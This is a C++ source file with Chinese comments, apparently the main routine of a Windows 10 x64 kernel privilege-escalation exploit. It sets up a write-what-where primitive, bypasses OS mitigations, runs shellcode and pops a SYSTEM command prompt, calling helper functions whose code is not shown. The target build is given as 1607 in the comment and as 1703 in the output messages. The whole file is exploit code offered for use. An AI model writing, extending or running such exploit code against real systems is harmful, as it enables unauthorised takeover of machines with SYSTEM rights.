/*
* write_what_where:
*	1607 X64版本
* main.cpp:
*	实现程序的主要逻辑
*		[+] 构造write_what_where初始化环境	--	exploit.cpp
*		[+] 绕过		-- bypass.cpp
*		[+] 利用漏洞执行shellcode	 -- exploit.cpp
*		[+] 弹出cmd实现验证	-- assist.cpp
*/

#include "common.h"

int main()
{
	std::cout << "[+] 'write what where' exploit on windows 10 1703 x64" << std::endl;

	std::cout << "[+] Init to get a write-what-where primitive" << std::endl;
	if (initWriteWhatWhereEnvironment() == FALSE)
	{
		std::cout << "[+] Init Write What Where failed!!!" << std::endl;
		system("pause");
		return 0;
	}

	std::cout << "[+] bypass windows 10 1703 x64 mitigations " << std::endl;
	bypassDemo();

	std::cout << "[+] run your shellcode to escape privilege" << std::endl;
	runShellCode();
	std::cout << "[+] pop a cmd to confirm whether you are a system " << std::endl;
	popCmdToConfirm();
	
	system("pause");
	
	return 0;
}